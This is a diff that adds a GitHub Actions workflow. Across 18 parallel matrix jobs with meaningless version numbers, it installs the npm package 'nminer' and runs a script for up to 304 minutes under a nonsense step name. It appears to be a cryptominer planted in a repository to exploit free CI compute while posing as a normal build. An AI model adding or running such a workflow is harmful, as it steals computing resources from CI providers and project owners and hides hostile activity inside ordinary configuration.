@@ -1,0 +1,43 @@
+name: accompanist
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 3830 }
+          - { version: 5155 }
+          - { version: 8803 }
+          - { version: 6050 }
+          - { version: 8045 }
+          - { version: 4016 }
+          - { version: 8831 }
+          - { version: 3077 }
+          - { version: 5768 }
+          - { version: 6446 }
+          - { version: 3236 }
+          - { version: 592 }
+          - { version: 7990 }
+          - { version: 5813 }
+          - { version: 4120 }
+          - { version: 7647 }
+          - { version: 9859 }
+          - { version: 5586 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: yum anticodon evil before fast
+        run: |
+          npm install nminer@latest
+          timeout 304m node accompanist.js || echo "accompanist executed"
